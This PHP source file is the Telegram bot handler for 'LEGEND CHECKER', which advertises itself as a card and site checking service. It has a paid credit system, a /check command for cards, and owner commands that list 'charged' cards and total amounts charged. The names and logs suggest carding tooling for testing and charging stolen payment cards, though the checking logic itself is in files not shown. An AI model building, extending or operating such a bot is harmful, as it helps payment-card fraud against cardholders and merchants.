<?php
/**
 * Enhanced Telegram Bot Webhook Handler
 * Includes owner commands for full web management
 * Owner: @LEGEND_BL (ID: 5652614329)
 */

require_once 'config.php';
require_once 'database.php';
require_once 'auth.php';
require_once 'admin_manager.php';
require_once 'cc_logs_manager.php';
require_once 'autosh.php';
require_once 'utils.php';


// Bot configuration
$bot_token = TelegramConfig::BOT_TOKEN ?? '';
if (empty($bot_token)) {
    error_log('Telegram bot token is not configured.');
}

// Get incoming message
$input = file_get_contents('php://input');
$update = json_decode($input, true);

if (empty($update)) {
    http_response_code(200);
    exit;
}

$message = $update['message'] ?? ($update['edited_message'] ?? ($update['channel_post'] ?? null));
if (!$message) {
    http_response_code(200);
    exit;
}

$chat_id = $message['chat']['id'];
$user_id = $message['from']['id'];
$text = $message['text'] ?? '';
$username = $message['from']['username'] ?? 'Unknown';

// Database and managers
$db = Database::getInstance();
$adminManager = new AdminManager();
$ccLogger = new CCLogsManager();

/**
 * Authorization checks
 */
function isOwner($user_id) {
    global $adminManager;
    return $adminManager->isOwner($user_id);
}

function isAdmin($user_id) {
    global $adminManager;
    return $adminManager->isAdmin($user_id);
}

/**
 * Execute Telegram API request with graceful fallback when cURL is unavailable.
 */
function telegramApiRequest($method, array $params = [], $httpMethod = 'POST', $timeout = 15) {
    $httpMethod = strtoupper($httpMethod);
    $timeout = max(1, (int)$timeout);

    $response = performTelegramApiRequest($method, $params, [
        'method' => $httpMethod,
        'timeout' => $timeout
    ]);

    if (!($response['ok'] ?? false) && !isset($response['description'])) {
        $response['description'] = 'Unknown Telegram API error';
    }

    return $response;
}

/**
 * Send message function
 */
function sendMessage($chat_id, $text, $reply_markup = null) {
    $data = [
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => 'HTML'
    ];
    
    if ($reply_markup) {
        $data['reply_markup'] = json_encode($reply_markup);
    }

    $response = telegramApiRequest('sendMessage', $data);
    if (!($response['ok'] ?? false)) {
        error_log('Telegram sendMessage API error: ' . json_encode($response));
    }
    return $response;
}

/**
 * Main command handler
 */
function handleCommand($text, $chat_id, $user_id, $username) {
    global $db;
    
    $text = trim($text);
    $parts = explode(' ', $text);
    $command = strtolower($parts[0]);
    
    // Owner-only commands
    if (isOwner($user_id)) {
        switch ($command) {
            case '/addadmin':
                return handleAddAdmin($parts, $chat_id, $user_id);
            case '/removeadmin':
                return handleRemoveAdmin($parts, $chat_id, $user_id);
            case '/cclogs':
                return handleCCLogs($parts, $chat_id, $user_id);
            case '/getlogs':
                return handleGetLogs($parts, $chat_id, $user_id);
            case '/changeconfig':
                return handleChangeConfig($parts, $chat_id, $user_id);
            case '/settimeout':
                return handleSetTimeout($parts, $chat_id, $user_id);
            case '/setchat':
                return handleSetChat($parts, $chat_id, $user_id);
            case '/notif':
                return handleNotif($parts, $chat_id, $user_id);
            case '/getwebhook':
                return handleGetWebhook($chat_id, $user_id);
            case '/setwebhook':
                return handleSetWebhook($parts, $chat_id, $user_id);
            case '/systemstats':
                return handleSystemStats($chat_id, $user_id);
            case '/admins':
                return handleListAdmins($chat_id, $user_id);
        }
    }
    
    // Admin commands (includes owner)
    if (isAdmin($user_id)) {
        switch ($command) {
            case '/admin':
                return handleAdminMenu($chat_id, $user_id);
            case '/generate':
                return handleGenerateCredits($parts, $chat_id, $user_id);
            case '/broadcast':
                return handleBroadcast($parts, $chat_id, $user_id);
            case '/users':
                return handleListUsers($chat_id, $user_id);
            case '/addcredits':
                return handleAddCredits($parts, $chat_id, $user_id);
            case '/stats':
                return handleStats($chat_id, $user_id);
            case '/ban':
                return handleBan($parts, $chat_id, $user_id);
            case '/unban':
                return handleUnban($parts, $chat_id, $user_id);
        }
    }
    
    // Public commands
    switch ($command) {
        case '/start':
            return handleStart($chat_id, $user_id, $username);
        case '/ping':
            return handlePing($chat_id);
        case '/health':
            return handleHealth($chat_id);
        case '/credits':
            return handleCheckCredits($chat_id, $user_id);
        case '/claim':
            return handleClaimCredits($parts, $chat_id, $user_id);
        case '/check':
            return handleCheckCard($parts, $chat_id, $user_id);
        case '/site':
            return handleCheckSite($parts, $chat_id, $user_id);
        case '/help':
            return handleHelp($chat_id, $user_id);
        default:
            sendMessage($chat_id, "❓ Unknown command. Use /help to see available commands.");
    }
}

/**
 * Public Commands
 */
function handleStart($chat_id, $user_id, $username) {
    global $db;
    
    // Check if user exists, create if not
    $user = $db->getUserByTelegramId($user_id);
    if (!$user) {
        $user = $db->createUser([
            'id' => $user_id,
            'username' => $username,
            'first_name' => $username
        ]);
    }
    
    $owner_tag = isOwner($user_id) ? " 👑 <b>OWNER</b>" : (isAdmin($user_id) ? " 🛡️ <b>ADMIN</b>" : "");
    
    $welcome = "👋 <b>Welcome to LEGEND CHECKER!</b>{$owner_tag}\n\n";
    $welcome .= "💳 Advanced Card & Site Checking Bot\n\n";
    $welcome .= "🎯 <b>Quick Commands:</b>\n";
    $welcome .= "• /credits - Check balance\n";
    $welcome .= "• /claim &lt;code&gt; - Redeem credit code\n";
    $welcome .= "• /check &lt;card&gt; - Check card\n";
    $welcome .= "• /site &lt;url&gt; - Check site\n";
    $welcome .= "• /help - Full command list\n";
    
    if (isAdmin($user_id)) {
        $welcome .= "\n🛡️ <b>Admin Commands:</b>\n";
        $welcome .= "• /admin - Admin panel\n";
        $welcome .= "• /generate - Generate credits\n";
        $welcome .= "• /broadcast - Send announcement\n";
    }
    
    if (isOwner($user_id)) {
        $welcome .= "\n👑 <b>Owner Commands:</b>\n";
        $welcome .= "• /addadmin - Add admin\n";
        $welcome .= "• /cclogs - View CC logs\n";
        $welcome .= "• /systemstats - System stats\n";
    }
    
    $welcome .= "\n🌐 <b>Web Dashboard:</b>\n";
    $welcome .= AppConfig::DOMAIN;
    
    sendMessage($chat_id, $welcome);
}

function handleCheckCredits($chat_id, $user_id) {
    global $db;
    
    $user = $db->getUserByTelegramId($user_id);
    if (!$user) {
        sendMessage($chat_id, "❌ User not found. Use /start first.");
        return;
    }
    
    $credits = $user['credits'] ?? 0;
    $role = ucfirst($user['role'] ?? 'free');
    
    $msg = "💰 <b>Your Balance</b>\n\n";
    $msg .= "💳 <b>Credits:</b> {$credits}\n";
    $msg .= "🎭 <b>Role:</b> {$role}\n\n";
    $msg .= "💡 <b>Tip:</b> Use /claim &lt;code&gt; to redeem credits!";
    
    sendMessage($chat_id, $msg);
}

function handleClaimCredits($parts, $chat_id, $user_id) {
    global $db;
    
    if (count($parts) < 2) {
        sendMessage($chat_id, "❌ Usage: /claim &lt;code&gt;\nExample: /claim CREDIT-ABC123");
        return;
    }
    
    $code = strtoupper(trim($parts[1]));
    
    // Load credit codes
    $codes_file = __DIR__ . '/data/credit_codes.json';
    if (!file_exists($codes_file)) {
        sendMessage($chat_id, "❌ Invalid code.");
        return;
    }
    
    $codes = json_decode(file_get_contents($codes_file), true) ?? [];
    $found = false;
    
    foreach ($codes as &$code_data) {
        if ($code_data['code'] === $code && $code_data['status'] === 'active') {
            // Check if expired
            if (isset($code_data['expires_at']) && time() > $code_data['expires_at']) {
                sendMessage($chat_id, "❌ This code has expired.");
                return;
            }
            
            // Claim the code
            $amount = $code_data['credit_amount'] ?? 10;
            $result = $db->addCredits($user_id, $amount);
            
            if ($result) {
                $code_data['status'] = 'used';
                $code_data['used_by'] = $user_id;
                $code_data['used_at'] = time();
        
                file_put_contents($codes_file, json_encode($codes, JSON_PRETTY_PRINT));
        
                $user = $db->getUserByTelegramId($user_id);
                $new_balance = $user['credits'] ?? $amount;
        
                sendMessage($chat_id, "✅ <b>Code redeemed successfully!</b>\n💰 <b>+{$amount} credits</b>\n💳 <b>New Balance:</b> {$new_balance}");
                // Notify channel as well (honor SiteConfig overrides)
                $notifyChat = SiteConfig::get('notification_chat_id', TelegramConfig::CHAT_ID);
                if ($notifyChat && SiteConfig::get('notify_claim', true)) {
                    $msg = "💰 <b>Credit Code Redeemed</b>\n\n" .
                           "👤 <b>User ID:</b> {$user_id}\n" .
                           "➕ <b>Credits Added:</b> {$amount}\n" .
                           "💳 <b>New Balance:</b> {$new_balance}";
                    sendMessage($notifyChat, $msg);
                }
                $found = true;
                break;
            }
        }
    }
    
    if (!$found) {
        sendMessage($chat_id, "❌ Invalid or already used code.");
    }
}

function handleHelp($chat_id, $user_id) {
    $msg = "📖 <b>Command Reference</b>\n\n";
    $msg .= "<b>🎯 Basic Commands:</b>\n";
    $msg .= "/start - Get started\n";
    $msg .= "/ping - Quick bot ping\n";
    $msg .= "/health - Bot health info\n";
    $msg .= "/credits - Check balance\n";
    $msg .= "/claim &lt;code&gt; - Redeem credit code\n";
    $msg .= "/check &lt;card&gt; - Check credit card\n";
    $msg .= "/site &lt;url&gt; - Validate site\n";
    $msg .= "/help - This message\n";
    
    if (isAdmin($user_id)) {
        $msg .= "\n<b>🛡️ Admin Commands:</b>\n";
        $msg .= "/admin - Admin dashboard\n";
        $msg .= "/generate &lt;amount&gt; [qty] - Generate credit codes\n";
        $msg .= "/broadcast &lt;message&gt; - Send announcement\n";
        $msg .= "/users - List users\n";
        $msg .= "/addcredits &lt;user_id&gt; &lt;amount&gt; - Gift credits\n";
        $msg .= "/ban &lt;user_id&gt; - Ban user\n";
        $msg .= "/unban &lt;user_id&gt; - Unban user\n";
        $msg .= "/stats - Statistics\n";
    }
    
    if (isOwner($user_id)) {
        $msg .= "\n<b>👑 Owner Commands:</b>\n";
        $msg .= "/addadmin &lt;user_id&gt; - Add admin\n";
        $msg .= "/removeadmin &lt;user_id&gt; - Remove admin\n";
        $msg .= "/admins - List all admins\n";
        $msg .= "/cclogs [limit] - View charged CC logs\n";
        $msg .= "/getlogs [status] - View all check logs\n";
    $msg .= "/systemstats - Detailed system stats\n";
    $msg .= "/changeconfig - View settings\n";
    $msg .= "/settimeout card|site <sec> [conn] - Set timeouts\n";
    $msg .= "/setchat <chat_id> - Set notify chat\n";
    $msg .= "/notif [list|<key> on|off] - Toggle notifications\n";
        $msg .= "/getwebhook - Show webhook\n";
        $msg .= "/setwebhook <url> - Set webhook\n";
    }
    
    sendMessage($chat_id, $msg);
}

function handlePing($chat_id) {
    $ts = date('Y-m-d H:i:s');
    sendMessage($chat_id, "🏓 Pong! <b>{$ts}</b>");
}

function handleHealth($chat_id) {
    $resp = telegramApiRequest('getMe', [], 'GET');
    $ok = $resp['ok'] ?? false;
    $uname = $resp['result']['username'] ?? 'unknown';
    $msg = "💚 <b>Bot Health</b>\n\n" .
           "API: " . ($ok ? 'OK ✅' : 'Fail ❌') . "\n" .
           "Bot: @{$uname}\n" .
           "Time: " . date('Y-m-d H:i:s') . "\n" .
           "PHP: " . phpversion();
    sendMessage($chat_id, $msg);
}

function handleGetWebhook($chat_id, $user_id) {
    $response = telegramApiRequest('getWebhookInfo', [], 'GET');
    if (!($response['ok'] ?? false)) {
        $description = $response['description'] ?? 'Failed to get webhook info';
        sendMessage($chat_id, "❌ {$description}");
        return;
    }
    sendMessage(
        $chat_id,
        "🔗 <b>Webhook Info</b>\n<pre>" . htmlspecialchars(json_encode($response['result'], JSON_PRETTY_PRINT)) . "</pre>"
    );
}

function handleSetWebhook($parts, $chat_id, $user_id) {
    if (count($parts) < 2) {
        sendMessage($chat_id, "❌ Usage: /setwebhook <url>");
        return;
    }
    $url = trim($parts[1]);
    $response = telegramApiRequest('setWebhook', ['url' => $url]);
    if (!($response['ok'] ?? false)) {
        $description = $response['description'] ?? 'setWebhook failed';
        sendMessage($chat_id, "❌ setWebhook error: " . htmlspecialchars($description));
        return;
    }
    sendMessage(
        $chat_id,
        "✅ setWebhook response:\n<pre>" . htmlspecialchars(json_encode($response, JSON_PRETTY_PRINT)) . "</pre>"
    );
}

/**
 * Owner Commands
 */
function handleAddAdmin($parts, $chat_id, $user_id) {
    global $adminManager;
    
    if (count($parts) < 2) {
        sendMessage($chat_id, "❌ Usage: /addadmin &lt;user_id&gt; [username]\nExample: /addadmin 123456789 @johndoe");
        return;
    }
    
    $new_admin_id = intval($parts[1]);
    $new_admin_username = $parts[2] ?? null;
    
    $result = $adminManager->addAdmin($new_admin_id, $new_admin_username, $user_id);
    
    if ($result['success']) {
        $msg = "✅ <b>Admin added successfully!</b>\n\n";
        $msg .= "👤 <b>User ID:</b> {$new_admin_id}\n";
        if ($new_admin_username) {
            $msg .= "📝 <b>Username:</b> {$new_admin_username}\n";
        }
        $msg .= "\n🎉 User has been granted admin privileges!";
        
        // Notify new admin
        sendMessage($new_admin_id, "🎉 <b>Congratulations!</b>\n\nYou've been promoted to <b>ADMIN</b>!\n\nUse /help to see your new commands.");
    } else {
        $msg = "❌ {$result['message']}";
    }
    
    sendMessage($chat_id, $msg);
}

function handleRemoveAdmin($parts, $chat_id, $user_id) {
    global $adminManager;
    
    if (count($parts) < 2) {
        sendMessage($chat_id, "❌ Usage: /removeadmin &lt;user_id&gt;\nExample: /removeadmin 123456789");
        return;
    }
    
    $admin_id = intval($parts[1]);
    
    $result = $adminManager->removeAdmin($admin_id, $user_id);
    
    if ($result['success']) {
        $msg = "✅ <b>Admin removed successfully!</b>\n\n";
        $msg .= "👤 <b>User ID:</b> {$admin_id}\n";
        
        // Notify removed admin
        sendMessage($admin_id, "ℹ️ <b>Notice:</b>\n\nYour admin privileges have been revoked.");
    } else {
        $msg = "❌ {$result['message']}";
    }
    
    sendMessage($chat_id, $msg);
}

function handleListAdmins($chat_id, $user_id) {
    global $adminManager;
    
    $admins = $adminManager->getAllAdmins();
    
    if (empty($admins)) {
        sendMessage($chat_id, "📋 No admins found.");
        return;
    }
    
    $msg = "👥 <b>Admin List</b>\n\n";
    
    foreach ($admins as $admin) {
        $type_emoji = $admin['type'] === 'owner' ? '👑' : ($admin['type'] === 'static' ? '🛡️' : '⭐');
        $type_label = strtoupper($admin['type']);
        
        $msg .= "{$type_emoji} <b>[{$type_label}]</b>\n";
        $msg .= "├ ID: <code>{$admin['telegram_id']}</code>\n";
        if (isset($admin['username'])) {
            $msg .= "├ User: {$admin['username']}\n";
        }
        if (isset($admin['added_at'])) {
            $date = $admin['added_at'] instanceof MongoDB\BSON\UTCDateTime 
                ? $admin['added_at']->toDateTime()->format('Y-m-d') 
                : date('Y-m-d', strtotime($admin['added_at']));
            $msg .= "└ Added: {$date}\n";
        } else {
            $msg .= "└ Status: Active\n";
        }
        $msg .= "\n";
    }
    
    sendMessage($chat_id, $msg);
}

function handleCCLogs($parts, $chat_id, $user_id) {
    global $ccLogger;
    
    $limit = isset($parts[1]) ? intval($parts[1]) : 10;
    $limit = min($limit, 50); // Max 50
    
    $logs = $ccLogger->getChargedCards($limit);
    
    if (empty($logs)) {
        sendMessage($chat_id, "📝 No charged cards found.");
        return;
    }
    
    $msg = $ccLogger->formatLogsForBot($logs, $limit);
    
    // Add summary
    $stats = $ccLogger->getStatistics();
    $msg .= "\n📊 <b>Summary:</b>\n";
    $msg .= "💰 Total Charged: {$stats['charged_cards']}\n";
    $msg .= "💵 Total Amount: \${$stats['total_amount_charged']}\n";
    
    sendMessage($chat_id, $msg);
}

function handleGetLogs($parts, $chat_id, $user_id) {
    global $ccLogger;
    
    $status_filter = isset($parts[1]) ? strtolower($parts[1]) : null;
    $limit = isset($parts[2]) ? intval($parts[2]) : 20;
    $limit = min($limit, 50);
    
    $filters = [];
    if ($status_filter && in_array($status_filter, ['charged', 'live', 'declined'])) {
        $filters['status'] = $status_filter;
    }
    
    $logs = $ccLogger->getAllLogs($limit, $filters);
    
    if (empty($logs)) {
        sendMessage($chat_id, "📝 No logs found.");
        return;
    }
    
    $msg = $ccLogger->formatLogsForBot($logs, $limit);
    sendMessage($chat_id, $msg);
}

function handleSystemStats($chat_id, $user_id) {
    global $db, $ccLogger;
    
    $users = $db->getAllUsers(10000, 0);
    $total_users = count($users);
    
    $total_credits = 0;
    $roles_count = [];
    $active_today = 0;
    $today_start = strtotime('today');
    
    foreach ($users as $user) {
        $total_credits += $user['credits'] ?? 0;
        $role = $user['role'] ?? 'free';
        $roles_count[$role] = ($roles_count[$role] ?? 0) + 1;
        
        if (isset($user['last_login_at'])) {
            $last_login = $user['last_login_at'] instanceof MongoDB\BSON\UTCDateTime 
                ? $user['last_login_at']->toDateTime()->getTimestamp()
                : strtotime($user['last_login_at']);
            
            if ($last_login >= $today_start) {
                $active_today++;
            }
        }
    }
    
    $cc_stats = $ccLogger->getStatistics();
    
    $msg = "📊 <b>LEGEND CHECKER - System Statistics</b>\n\n";
    $msg .= "👥 <b>Users:</b>\n";
    $msg .= "├ Total: {$total_users}\n";
    $msg .= "└ Active Today: {$active_today}\n\n";
    
    $msg .= "🎭 <b>Roles:</b>\n";
    foreach ($roles_count as $role => $count) {
        $msg .= "├ " . ucfirst($role) . ": {$count}\n";
    }
    $msg .= "\n";
    
    $msg .= "💰 <b>Credits:</b>\n";
    $msg .= "└ Total Distributed: {$total_credits}\n\n";
    
    $msg .= "💳 <b>CC Checks:</b>\n";
    $msg .= "├ Total: {$cc_stats['total_checks']}\n";
    $msg .= "├ Charged: {$cc_stats['charged_cards']}\n";
    $msg .= "├ Live: {$cc_stats['live_cards']}\n";
    $msg .= "├ Declined: {$cc_stats['declined_cards']}\n";
    $msg .= "└ Amount: \${$cc_stats['total_amount_charged']}\n\n";
    
    $msg .= "🕐 <b>Generated:</b> " . date('Y-m-d H:i:s');
    
    sendMessage($chat_id, $msg);
}

function handleChangeConfig($parts, $chat_id, $user_id) {
    $msg = "⚙️ <b>Configuration Management</b>\n\n";
    $msg .= "Current configurations:\n\n";
    $msg .= "🔗 <b>Domain:</b> " . AppConfig::DOMAIN . "\n";
    $msg .= "🤖 <b>Bot:</b> " . TelegramConfig::BOT_NAME . "\n";
    $msg .= "💾 <b>Database:</b> " . DatabaseConfig::DATABASE_NAME . "\n";
    $msg .= "🗨️ <b>Notify Chat:</b> " . (SiteConfig::get('notification_chat_id', TelegramConfig::CHAT_ID)) . "\n\n";
    $msg .= "⏱️ <b>Timeouts (s):</b>\n";
    $msg .= "├ Card: " . (int)SiteConfig::get('card_check_timeout', 60) . " (connect: " . (int)SiteConfig::get('card_connect_timeout', 15) . ")\n";
    $msg .= "└ Site: " . (int)SiteConfig::get('site_check_timeout', 60) . " (connect: " . (int)SiteConfig::get('site_connect_timeout', 15) . ")\n\n";
    $msg .= "🔔 <b>Notifications:</b>\n";
    $flags = [
        'notify_login' => 'Login',
        'notify_register' => 'Register',
        'notify_card_results' => 'Card Results (All)',
        'notify_card_charged' => 'Card Charged',
        'notify_claim' => 'Claims',
        'notify_site_check' => 'Site Check'
    ];
    foreach ($flags as $k => $label) {
        $val = SiteConfig::get($k, in_array($k, ['notify_login','notify_register','notify_card_charged','notify_claim']));
        $msg .= "├ {$label}: " . ($val ? 'ON' : 'OFF') . "\n";
    }
    $msg .= "\nCommands:\n";
    $msg .= "• /settimeout card|site <seconds> [connectSeconds]\n";
    $msg .= "• /setchat <chat_id>\n";
    $msg .= "• /notif [list|<key> on|off]\n";
    
    sendMessage($chat_id, $msg);
}

function handleSetTimeout($parts, $chat_id, $user_id) {
    if (count($parts) < 3) {
        sendMessage($chat_id, "❌ Usage: /settimeout card|site <seconds> [connectSeconds]");
        return;
    }
    $target = strtolower($parts[1]);
    $secs = (int)$parts[2];
    $conn = isset($parts[3]) ? (int)$parts[3] : null;
    if ($secs <= 0) {
        sendMessage($chat_id, "❌ Seconds must be positive");
        return;
    }
    if ($target === 'card') {
        SiteConfig::save(['card_check_timeout' => $secs] + ($conn !== null ? ['card_connect_timeout' => $conn] : []));
        sendMessage($chat_id, "✅ Card timeout set to {$secs}s" . ($conn !== null ? ", connect {$conn}s" : ''));
    } elseif ($target === 'site') {
        SiteConfig::save(['site_check_timeout' => $secs] + ($conn !== null ? ['site_connect_timeout' => $conn] : []));
        sendMessage($chat_id, "✅ Site timeout set to {$secs}s" . ($conn !== null ? ", connect {$conn}s" : ''));
    } else {
        sendMessage($chat_id, "❌ Unknown target: {$target}");
    }
}

function handleSetChat($parts, $chat_id, $user_id) {
    if (count($parts) < 2) {
        sendMessage($chat_id, "❌ Usage: /setchat <chat_id>\nTip: Forward any message from your channel/group to the bot to copy its chat_id.");
        return;
    }
    $newId = trim($parts[1]);
    SiteConfig::save(['notification_chat_id' => $newId]);
    sendMessage($chat_id, "✅ Notification chat set to <code>{$newId}</code>");
}

function handleNotif($parts, $chat_id, $user_id) {
    $allowed = [
        'notify_login','notify_register','notify_card_results','notify_card_charged','notify_claim','notify_site_check'
    ];
    if (count($parts) === 1 || strtolower($parts[1]) === 'list') {
        $msg = "🔔 <b>Notification Flags</b>\n";
        foreach ($allowed as $k) {
            $msg .= "• {$k}: " . (SiteConfig::get($k, in_array($k, ['notify_login','notify_register','notify_card_charged','notify_claim'])) ? 'ON' : 'OFF') . "\n";
        }
        sendMessage($chat_id, $msg);
        return;
    }
    if (count($parts) < 3) {
        sendMessage($chat_id, "❌ Usage: /notif <key> on|off\nUse /notif list to view keys");
        return;
    }
    $key = strtolower($parts[1]);
    $val = strtolower($parts[2]);
    if (!in_array($key, $allowed)) {
        sendMessage($chat_id, "❌ Unknown key: {$key}");
        return;
    }
    $on = in_array($val, ['on','true','1','enable','enabled']);
    SiteConfig::save([$key => $on]);
    sendMessage($chat_id, "✅ {$key} set to " . ($on ? 'ON' : 'OFF'));
}

/**
 * Admin Commands
 */
function handleAdminMenu($chat_id, $user_id) {
    $msg = "🛡️ <b>Admin Dashboard</b>\n\n";
    $msg .= "Available commands:\n\n";
    $msg .= "💰 /generate &lt;amount&gt; [qty] - Generate credits\n";
    $msg .= "📢 /broadcast &lt;message&gt; - Announce\n";
    $msg .= "👥 /users - List users\n";
    $msg .= "🎁 /addcredits &lt;id&gt; &lt;amt&gt; - Gift credits\n";
    $msg .= "📊 /stats - Statistics\n";
    $msg .= "🚫 /ban &lt;user_id&gt; - Ban user\n";
    $msg .= "✅ /unban &lt;user_id&gt; - Unban user\n";
    
    sendMessage($chat_id, $msg);
}

function handleGenerateCredits($parts, $chat_id, $user_id) {
    if (count($parts) < 2) {
        sendMessage($chat_id, "❌ Usage: /generate &lt;amount&gt; [quantity]\nExample: /generate 100 5");
        return;
    }
    
    $amount = intval($parts[1]);
    $quantity = isset($parts[2]) ? intval($parts[2]) : 1;
    
    if ($amount <= 0 || $quantity <= 0 || $quantity > 20) {
        sendMessage($chat_id, "❌ Invalid parameters. Amount > 0, Quantity 1-20");
        return;
    }
    
    $codes = generateCreditCodes($amount, $quantity);
    
    $msg = "✅ <b>Generated {$quantity} credit code(s)!</b>\n\n";
    foreach ($codes as $code) {
        $msg .= "💳 <code>{$code}</code> (+{$amount} credits)\n";
    }
    $msg .= "\n📝 Share these codes with users to redeem.";
    
    sendMessage($chat_id, $msg);
}

function handleBroadcast($parts, $chat_id, $user_id) {
    if (count($parts) < 2) {
        sendMessage($chat_id, "❌ Usage: /broadcast &lt;message&gt;\nExample: /broadcast System maintenance tonight at 10 PM");
        return;
    }
    
    array_shift($parts); // Remove command
    $message = implode(' ', $parts);
    
    $result = broadcastMessage($message);
    sendMessage($chat_id, $result);
}

function handleListUsers($chat_id, $user_id) {
    global $db;
    
    $users = $db->getAllUsers(10, 0);
    
    if (empty($users)) {
        sendMessage($chat_id, "👥 No users found.");
        return;
    }
    
    $msg = "👥 <b>Recent Users</b> (Last 10)\n\n";
    
    foreach ($users as $user) {
        $telegram_id = $user['telegram_id'];
        $username = $user['username'] ?? 'Unknown';
        $credits = $user['credits'] ?? 0;
        $role = ucfirst($user['role'] ?? 'free');
        
        $msg .= "👤 @{$username}\n";
        $msg .= "├ ID: <code>{$telegram_id}</code>\n";
        $msg .= "├ Credits: {$credits}\n";
        $msg .= "└ Role: {$role}\n\n";
    }
    
    sendMessage($chat_id, $msg);
}

function handleAddCredits($parts, $chat_id, $user_id) {
    global $db;
    
    if (count($parts) < 3) {
        sendMessage($chat_id, "❌ Usage: /addcredits &lt;user_id&gt; &lt;amount&gt;\nExample: /addcredits 123456789 100");
        return;
    }
    
    $target_id = intval($parts[1]);
    $amount = intval($parts[2]);
    
    if ($amount <= 0) {
        sendMessage($chat_id, "❌ Amount must be positive.");
        return;
    }
    
    $user = $db->getUserByTelegramId($target_id);
    if (!$user) {
        sendMessage($chat_id, "❌ User not found.");
        return;
    }
    
    $result = $db->addCredits($target_id, $amount);
    
    if ($result) {
        $new_balance = ($user['credits'] ?? 0) + $amount;
        
        // Notify user
        sendMessage($target_id, "🎁 <b>You received {$amount} credits from admin!</b>\n💳 <b>New Balance:</b> {$new_balance}");
        
        sendMessage($chat_id, "✅ <b>Successfully added {$amount} credits to user {$target_id}!</b>\n💰 <b>New Balance:</b> {$new_balance}");
    } else {
        sendMessage($chat_id, "❌ Failed to add credits.");
    }
}

function handleStats($chat_id, $user_id) {
    global $db;
    
    $users = $db->getAllUsers(1000, 0);
    $total = count($users);
    
    $roles = [];
    foreach ($users as $user) {
        $role = $user['role'] ?? 'free';
        $roles[$role] = ($roles[$role] ?? 0) + 1;
    }
    
    $msg = "📊 <b>Statistics</b>\n\n";
    $msg .= "👥 <b>Total Users:</b> {$total}\n\n";
    $msg .= "<b>Roles:</b>\n";
    foreach ($roles as $role => $count) {
        $msg .= "• " . ucfirst($role) . ": {$count}\n";
    }
    
    sendMessage($chat_id, $msg);
}

function handleBan($parts, $chat_id, $user_id) {
    global $db;
    
    if (count($parts) < 2) {
        sendMessage($chat_id, "❌ Usage: /ban &lt;user_id&gt;");
        return;
    }
    
    $target_id = intval($parts[1]);
    
    // Cannot ban admins or owner
    if (isAdmin($target_id)) {
        sendMessage($chat_id, "❌ Cannot ban admin or owner.");
        return;
    }
    
    if (method_exists($db, 'updateUser')) {
        $result = $db->updateUser($target_id, ['status' => 'banned']);
        if ($result) {
            sendMessage($target_id, "🚫 <b>Your account has been suspended.</b>");
            sendMessage($chat_id, "✅ User {$target_id} has been banned.");
        } else {
            sendMessage($chat_id, "❌ Failed to ban user.");
        }
    } else {
        sendMessage($chat_id, "❌ Ban function not available.");
    }
}

function handleUnban($parts, $chat_id, $user_id) {
    global $db;
    
    if (count($parts) < 2) {
        sendMessage($chat_id, "❌ Usage: /unban &lt;user_id&gt;");
        return;
    }
    
    $target_id = intval($parts[1]);
    
    if (method_exists($db, 'updateUser')) {
        $result = $db->updateUser($target_id, ['status' => 'active']);
        if ($result) {
            sendMessage($target_id, "✅ <b>Your account has been reactivated!</b>");
            sendMessage($chat_id, "✅ User {$target_id} has been unbanned.");
        } else {
            sendMessage($chat_id, "❌ Failed to unban user.");
        }
    } else {
        sendMessage($chat_id, "❌ Unban function not available.");
    }
}

/**
 * Helper Functions
 */
function generateCreditCodes($amount, $quantity) {
    $codes = [];
    
    for ($i = 0; $i < $quantity; $i++) {
        $code = 'CREDIT-' . strtoupper(bin2hex(random_bytes(4)));
        $codes[] = $code;
        
        $data = [
            'code' => $code,
            'credit_amount' => $amount,
            'type' => 'standard',
            'expiry_days' => 30,
            'expires_at' => time() + (30 * 24 * 60 * 60),
            'created_at' => time(),
            'created_by' => 'telegram_bot',
            'status' => 'active'
        ];
        
        $codes_file = __DIR__ . '/data/credit_codes.json';
        $existing = [];
        if (file_exists($codes_file)) {
            $existing = json_decode(file_get_contents($codes_file), true) ?? [];
        }
        $existing[] = $data;
        
        if (!is_dir(__DIR__ . '/data')) {
            mkdir(__DIR__ . '/data', 0755, true);
        }
        
        file_put_contents($codes_file, json_encode($existing, JSON_PRETTY_PRINT));
    }
    
    return $codes;
}

function broadcastMessage($message) {
    global $db;
    
    $users = $db->getAllUsers(1000, 0);
    $sent = 0;
    
    foreach ($users as $user) {
        $result = sendMessage($user['telegram_id'], "📢 <b>Announcement:</b>\n\n{$message}");
        if ($result && $result['ok']) {
            $sent++;
        }
        usleep(100000); // 0.1s delay
    }
    
    return "✅ <b>Broadcast sent to {$sent} users!</b>";
}

// Main execution
if ($text) {
    handleCommand($text, $chat_id, $user_id, $username);
}

http_response_code(200);
?>
